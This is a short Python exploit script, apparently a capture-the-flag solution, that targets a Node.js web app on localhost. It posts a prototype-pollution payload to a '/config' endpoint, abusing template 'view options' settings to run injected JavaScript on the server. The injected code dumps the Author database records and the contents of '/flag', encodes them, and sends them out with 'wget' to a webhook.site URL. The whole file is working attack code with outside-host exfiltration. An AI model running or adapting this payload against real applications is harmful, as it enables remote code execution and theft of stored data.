#!/usr/bin/env python3
import requests
from datetime import datetime


payload = {
    "config_name": [
        "__proto__[view options][client]",
        "__proto__[view options][escapeFunction]"
    ],
    "value": [
        "1",
        """console.log;Author=process.mainModule.require('/app/models/Author').find().then(r => {
            b=Buffer.from(JSON.stringify(r)).toString('base64url');
            bbb=Buffer.from(process.mainModule.require('fs').readFileSync('/flag')).toString('base64url');
            process.mainModule.require('child_process').execSync('wget https://webhook.site/9af7c2b5-4d00-4c7a-80a6-63a2400d20a0?b='+b+'');
            process.mainModule.require('child_process').execSync('wget https://webhook.site/9af7c2b5-4d00-4c7a-80a6-63a2400d20a0?b='+bbb+'');
        });"""
    ]
}

s = requests.Session()
r = s.post("http://localhost:50000/config", json=payload)
print("[+] Config sent:", r.status_code)
r = s.get("http://localhost:50000//")
print(r.text)